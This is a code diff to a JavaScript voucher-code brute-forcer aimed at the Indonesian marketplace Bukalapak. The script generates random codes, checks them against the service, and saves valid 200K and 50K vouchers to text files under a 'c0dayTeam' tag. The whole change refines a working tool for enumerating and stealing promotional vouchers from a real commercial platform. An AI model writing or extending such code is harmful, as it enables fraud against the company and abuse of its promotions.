@@ -45,8 +45,14 @@ async function start(base, length, berapakali) {
 		const kodenya = await generateCode(base, length);
 		const checking = await check(kodenya, length);
 		if (checking == "Pastikan kamu memasukkan kode voucher yang benar") {
-			fs.appendFileSync('dd.txt', `${kodenya} [ ${checking} ] - c0dayTeam \n`);
-		console.log(i+`.DIE ${kodenya} [ ${checking} ] -c0dayTeam`);
+			
+		console.log(i+`.DIE ${kodenya} -c0dayTeam`);
+		}if (checking == "Voucher hanya berlaku untuk transaksi di Aplikasi Android Bukalapak dan Aplikasi iOS Bukalapak") {
+			fs.appendFileSync('cdy.txt', `${kodenya} [ 200k ] - c0dayTeam \n`);
+		console.log(i+`.LIVE ${kodenya} [ 200K ] -c0dayTeam`);
+		}if (checking == "Silakan konfirmasi email akun Bukalapak Anda untuk menggunakan voucher ini") {
+			fs.appendFileSync('50.txt', `${kodenya} [ 50K ] - c0dayTeam \n`);
+		console.log(i+`.LIVE ${kodenya} [ 50K ] -c0dayTeam`);
 		} else {
 			fs.appendFileSync('gg.txt', `${kodenya} [ ${checking} ] - c0dayTeam\n`);
 		console.log(i+`.LIVE ${kodenya} [ ${checking} ] -c0dayTeam`);
